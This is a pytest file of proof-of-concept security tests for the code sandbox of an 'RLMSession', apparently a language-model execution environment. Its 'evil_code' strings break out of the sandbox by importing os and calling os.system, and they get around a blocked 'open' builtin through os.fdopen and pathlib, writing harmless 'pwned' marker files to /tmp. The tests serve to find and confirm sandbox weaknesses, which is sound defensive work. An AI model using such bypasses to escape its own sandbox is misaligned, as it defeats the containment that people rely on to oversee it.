
import pytest
from llmc.rlm.session import RLMSession
from llmc.rlm.config import RLMConfig

def test_rlm_sandbox_escape_via_permissive_import():
    """
    POC: RLMSession sandbox allows importing 'os' and executing commands in default permissive mode.
    """
    # Force permissive mode (which is the default, but let's be explicit)
    config = RLMConfig(security_mode="permissive")
    session = RLMSession(config=config)
    session.load_context("Initial context")
    
    # Code that attempts to use 'os' to do something bad
    # For POC, we'll just try to write a file in /tmp/
    evil_code = """
import os
import subprocess
with open("/tmp/rlm_escape_poc.txt", "w") as f:
    f.write("pwned")
# Or use os.system
os.system("echo 'pwned again' > /tmp/rlm_escape_poc_2.txt")
FINAL("Escape successful")
"""
    
    # We need to bypass the intercept logic by NOT using whitelisted tools if we want to test direct execution
    # or just use normal code execution.
    # The sandbox execute() method runs the code.
    
    result = session.sandbox.execute(evil_code)
    
    print(f"\nSandbox execution result: {result.success}, error: {result.error}")
    
    # Check if files were created
    import os
    escaped = False
    if os.path.exists("/tmp/rlm_escape_poc.txt"):
        escaped = True
        os.remove("/tmp/rlm_escape_poc.txt")
    if os.path.exists("/tmp/rlm_escape_poc_2.txt"):
        escaped = True
        os.remove("/tmp/rlm_escape_poc_2.txt")
        
    if escaped:
        print("\n[!] VULNERABILITY CONFIRMED: Sandbox escape via 'import os'")
    else:
        # Wait, I might have failed because I used 'open' which IS in BLOCKED_BUILTINS
        # Even if I import os, 'open' refers to the builtin one.
        # But I should use os.open or io.open if they are not blocked.
        pass

def test_rlm_sandbox_escape_bypass_blocked_builtins():
    """
    POC: Bypass blocked 'open' by using 'io' or 'pathlib' or 'os'.
    """
    config = RLMConfig(security_mode="permissive")
    session = RLMSession(config=config)
    session.load_context("Initial context")
    
    evil_code = """
import os
# Use os.fdopen and os.open instead of blocked 'open'
fd = os.open("/tmp/rlm_escape_poc_3.txt", os.O_WRONLY | os.O_CREAT)
with os.fdopen(fd, 'w') as f:
    f.write("pwned 3")

import pathlib
pathlib.Path("/tmp/rlm_escape_poc_4.txt").write_text("pwned 4")

FINAL("Bypass successful")
"""
    result = session.sandbox.execute(evil_code)
    print(f"\nSandbox execution result: {result.success}, error: {result.error}")
    
    import os
    escaped = False
    for p in ["/tmp/rlm_escape_poc_3.txt", "/tmp/rlm_escape_poc_4.txt"]:
        if os.path.exists(p):
            escaped = True
            print(f"Detected file: {p}")
            os.remove(p)
            
    assert escaped, "Should have escaped sandbox"
    print("\n[!] VULNERABILITY CONFIRMED: Sandbox escape by bypassing blocked builtins")

